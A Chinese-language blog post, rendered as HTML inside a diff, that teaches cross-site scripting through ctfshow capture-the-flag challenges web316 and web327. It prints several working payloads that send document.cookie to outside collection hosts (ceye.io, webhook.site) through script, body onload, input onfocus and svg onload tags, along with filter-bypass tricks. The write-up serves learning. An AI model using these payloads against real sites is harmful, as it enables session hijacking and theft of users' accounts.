@@ -1,0 +1,966 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=50155&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="什么是XSS漏洞 \u200b XSS，即跨站脚本攻击，指用户将恶意JavaScript代码注入到网页当中，网页会执行这些恶意代码，从而形成漏洞。 \u200b 可以理">
+<title>XSS</title>
+
+<link rel='canonical' href='http://localhost:50155/p/xss/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="XSS">
+<meta property='og:description' content="什么是XSS漏洞 \u200b XSS，即跨站脚本攻击，指用户将恶意JavaScript代码注入到网页当中，网页会执行这些恶意代码，从而形成漏洞。 \u200b 可以理">
+<meta property='og:url' content='http://localhost:50155/p/xss/'>
+<meta property='og:site_name' content='liernian'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-03-11T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-03-11T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="XSS">
+<meta name="twitter:description" content="什么是XSS漏洞 \u200b XSS，即跨站脚本攻击，指用户将恶意JavaScript代码注入到网页当中，网页会执行这些恶意代码，从而形成漏洞。 \u200b 可以理">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu11319725144555339807.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💯</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">liernian</a></h1>
+            <h2 class="site-description">理想主义的中二少年</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="http://localhost:50155/en/" >English</option>
+                                
+                                    <option value="http://localhost:50155/" selected>简体中文</option>
+                                
+                                    <option value="http://localhost:50155/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#什么是xss漏洞">什么是XSS漏洞</a></li>
+    <li><a href="#xss漏洞的分类">XSS漏洞的分类</a>
+      <ol>
+        <li><a href="#反射性xss">反射性XSS</a>
+          <ol>
+            <li><a href="#例题ctfshow_web316">例题ctfshow_web316</a></li>
+            <li><a href="#过滤手法">过滤手法</a></li>
+          </ol>
+        </li>
+        <li><a href="#存储型xss">存储型XSS</a>
+          <ol>
+            <li><a href="#例题ctfshow_web327">例题ctfshow_web327</a></li>
+          </ol>
+        </li>
+        <li><a href="#dom型xss">DOM型XSS</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/" >
+                知识点总结
+            </a>
+        
+            <a href="/categories/web/" >
+                Web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/xss/">XSS</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-03-11</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="什么是xss漏洞">什么是XSS漏洞
+</h2><p>​    XSS，即跨站脚本攻击，指用户将恶意JavaScript代码注入到网页当中，网页会执行这些恶意代码，从而形成漏洞。</p>
+<p>​    可以理解为网站的注入攻击，将恶意脚本注入到网页，别的用户访问时，浏览器就会对网页进行解析执行，达到攻击网站的其它访问者。</p>
+<p>​    所以xss的攻击对象并不是网页，而是访问网页的人（盗取cookie啥的）。</p>
+<h2 id="xss漏洞的分类">XSS漏洞的分类
+</h2><h3 id="反射性xss">反射性XSS
+</h3><p>​        反射型XSS是非持久性、参数型跨站脚本。
+​         此时js恶意代码是存在于某个参数中，通过url后缀进行get传入，当其他用户点进这个被精心构造的url链接时，恶意代码就会被解析，从而盗取用户信息。</p>
+<p>​        举个例子：</p>
+<h4 id="例题ctfshow_web316">例题ctfshow_web316
+</h4><p><img src="/p/xss/fcc51be9f85c48409ae173e254098f1e.png"
+	width="2229"
+	height="559"
+	srcset="/p/xss/fcc51be9f85c48409ae173e254098f1e_hu8430459144391909305.png 480w, /p/xss/fcc51be9f85c48409ae173e254098f1e_hu11489743218022425464.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="398"
+		data-flex-basis="956px"
+	
+></p>
+<p>​</p>
+<p>​        对于CTF的XSS题目来说，重要的不是如何注入js恶意代码，而是如何获取flag，刚刚上面讲了，XSS攻击的不是网站，盗取的不是网站的信息，而是访问页面的人。
+​         ctfshow的题目里有个机器人隔一段时间就会访问这个页面，解析你的pyload，这里它就充当了受害者，flag就在它的cookie中。</p>
+<p>​        所以，我们构造</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">img</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;img&#34;</span><span class="p">);</span> <span class="nx">img</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">&#34;网址&#34;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>​        意思就是，生成一个img对象，然后加载一张图片，并携带上当前的cookie，一并发往“网址”中
+​         那么网址从哪儿来呢？</p>
+<p>​        这里有三个方法</p>
+<p>​        <strong>1.自己的服务器</strong></p>
+<p>​        <strong>2.网上现有的平台</strong>，如<a class="link" href="http://ceye.io/introduce"  target="_blank" rel="noopener"
+    >CEYE - Monitor service for security testing</a>，<a class="link" href="https://webhook.site/"  target="_blank" rel="noopener"
+    >Webhook.site - Test, transform and automate Web requests and emails</a></p>
+<p>​        <strong>3.xss平台</strong>，如<a class="link" href="https://xss.pt/xss.php"  target="_blank" rel="noopener"
+    >XSS Platform</a></p>
+<p>​        我没有自己的服务器，然后xss平台没有成功过，这里就用第二种方法</p>
+<p>​        值得注意的是，如果用的是<strong>ceye</strong>的话，这里才是正确的域名</p>
+<p><img src="/p/xss/f15d1d98ca244b60834f825f219cb18d.png"
+	width="1446"
+	height="768"
+	srcset="/p/xss/f15d1d98ca244b60834f825f219cb18d_hu12800294290925970558.png 480w, /p/xss/f15d1d98ca244b60834f825f219cb18d_hu11163331315038355249.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="188"
+		data-flex-basis="451px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+>编辑</p>
+<p>​        如果用的是webhook，那么网站在这里</p>
+<p><img src="/p/xss/c4495a221aef4796a2974168e171d7c6.png"
+	width="1434"
+	height="528"
+	srcset="/p/xss/c4495a221aef4796a2974168e171d7c6_hu15759441899785416250.png 480w, /p/xss/c4495a221aef4796a2974168e171d7c6_hu15394133346957762891.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="271"
+		data-flex-basis="651px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+>编辑</p>
+<p>​        所以构造以下pyload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="err">#</span><span class="nx">如果是ceye</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">img</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;img&#34;</span><span class="p">);</span> <span class="nx">img</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">&#34;http://2fu4td.ceye.io/&#34;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="nx">如果是webhook</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">img</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;img&#34;</span><span class="p">);</span> <span class="nx">img</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">&#34;https://webhook.site/50be7301-a916-4df1-a04f-3e4513569671&#34;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p><img src="/p/xss/89b34d016c674dbb9c2ad400e193a263.png"
+	width="2137"
+	height="699"
+	srcset="/p/xss/89b34d016c674dbb9c2ad400e193a263_hu14965603801356633419.png 480w, /p/xss/89b34d016c674dbb9c2ad400e193a263_hu10199404068396746366.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="305"
+		data-flex-basis="733px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p><img src="/p/xss/b50c1928ca834d38b42c9eb71c72730a.png"
+	width="1546"
+	height="521"
+	srcset="/p/xss/b50c1928ca834d38b42c9eb71c72730a_hu14564814893917784852.png 480w, /p/xss/b50c1928ca834d38b42c9eb71c72730a_hu11490822234631277200.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="296"
+		data-flex-basis="712px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​        那么这道题目就解决啦</p>
+<h4 id="过滤手法">过滤手法
+</h4><p>​        常用的pyload有以下几种，还有的没写可以跳转
+​         <a class="link" href="https://blog.csdn.net/qq_45459211/article/details/130543280?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=130543280&amp;sharerefer=PC&amp;sharesource=Takagiapa&amp;sharefrom=from_link"  target="_blank" rel="noopener"
+    >ctfshow_web316-326_反射型XSS_ctfshow316-CSDN博客</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="err">#</span><span class="nx">script</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="kd">var</span> <span class="nx">img</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;img&#34;</span><span class="p">);</span> <span class="nx">img</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">&#34;网址&#34;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="nx">body</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">body</span> <span class="nx">onload</span><span class="o">=</span><span class="s2">&#34;window.open(&#39;网址&#39;+document.cookie)&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="nx">input</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">onfocus</span><span class="o">=</span><span class="s2">&#34;window.open(&#39;网址&#39;+document.cookie)&#34;</span> <span class="nx">autofocus</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="nx">svg</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">svg</span> <span class="nx">onload</span><span class="o">=</span><span class="s2">&#34;window.open(&#39;http://....ceye.io/&#39;+document.cookie)&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">#</span><span class="nx">什么意思不重要</span><span class="err">，</span><span class="nx">作用都是把cookie带去那个网站里</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">空格的话可以用Tab键</span><span class="err">，</span><span class="cm">/**/</span><span class="nx">和</span><span class="o">/</span><span class="nx">代替</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<h3 id="存储型xss">存储型XSS
+</h3><p>​        存储型XSS字如其名，js代码会被存储在网页的数据库中，比如说留言板。这类XSS漏洞的危害较大，只要用户查看了恶意用户的留言，就会被盗取信息</p>
+<p>​        实现方法其实差不多，这里不多赘述</p>
+<p>​        不过在ctfshow里，该类型的题目还有点绕，这里也举一个例子</p>
+<h4 id="例题ctfshow_web327">例题ctfshow_web327
+</h4><p>​    <img src="/p/xss/14bc2ae9a1f349989a54172c97795426.png"
+	width="2199"
+	height="498"
+	srcset="/p/xss/14bc2ae9a1f349989a54172c97795426_hu13980565226158469724.png 480w, /p/xss/14bc2ae9a1f349989a54172c97795426_hu16734471962282122203.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="441"
+		data-flex-basis="1059px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p>​        过一遍所有可能的功能之后，发现有登录系统，注册系统，查看用户等功能</p>
+<p>​        我们注册用户，用户名随便，密码使用构造的js代码，然后用这个登录账号和密码登录，之后会接受到，我们得到这个cookie之后，替换掉我们的cookie</p>
+<p>​        js代码用上面给过的就行</p>
+<p><img src="/p/xss/725ee0de79224e7fb8e7267ac2cb4dcd.png"
+	width="2138"
+	height="236"
+	srcset="/p/xss/725ee0de79224e7fb8e7267ac2cb4dcd_hu12854146238376914781.png 480w, /p/xss/725ee0de79224e7fb8e7267ac2cb4dcd_hu11643991844938459559.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="905"
+		data-flex-basis="2174px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<p><img src="/p/xss/1fe939960cf9424b94a8c33310433108.png"
+	width="2105"
+	height="550"
+	srcset="/p/xss/1fe939960cf9424b94a8c33310433108_hu4607129702758640883.png 480w, /p/xss/1fe939960cf9424b94a8c33310433108_hu10614594495761390088.png 1024w"
+	loading="lazy"
+	
+		alt="Photo by Florian Klauer on Unsplash"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="382"
+		data-flex-basis="918px"
+	
+><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="
+	
+	
+	
+	loading="lazy"
+	
+		alt="点击并拖拽以移动"
+	
+	
+></p>
+<h3 id="dom型xss">DOM型XSS
+</h3><p>​        DOM是文档对象模型，JavaScript会按照这个模型对界面进行增删改查。DOM型XSS就是修改页面中的DOM树，并不会传到服务器中，所以DOM型XSS是一种纯粹的前端漏洞，通常也是通过构造url实现</p>
+<p>​    额，ctfshow里并没有类似的题目，这里也就不多赘述了</p>
+<h1 id="小结">小结
+</h1><p>​    XSS漏洞大概就是这样，学习的时候遇到的大难点就是如何把cookie带出来，研究了很久也是差不多结束了。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/%E5%86%85%E5%AD%98%E9%A9%AC/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">内存马</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/ssti/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SSTI</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/jwt/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JWT</h2>
